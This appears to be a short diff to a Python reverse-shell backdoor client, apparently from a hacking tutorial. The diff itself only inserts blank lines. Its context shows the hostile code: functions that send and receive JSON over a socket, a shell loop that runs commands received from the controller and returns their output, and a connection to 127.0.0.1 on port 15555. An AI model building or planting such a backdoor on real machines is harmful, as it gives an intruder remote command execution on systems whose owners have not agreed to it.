@@ -7,6 +7,7 @@ def reliable_send(data):
     json_data = json.dumps(data)
     sock.send(json_data.encode())
 
+
 def reliable_recv():    
     json_data = ''
     while True:
@@ -15,6 +16,7 @@ def reliable_recv():
             return json.loads(json_data)
         except ValueError:
             continue
+
 
 def shell():
     while True:
@@ -28,6 +30,7 @@ def shell():
                 reliable_send(result)
             except:
                 reliable_send("[!!] Can't Execute the Command")
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(('127.0.0.1', 15555))
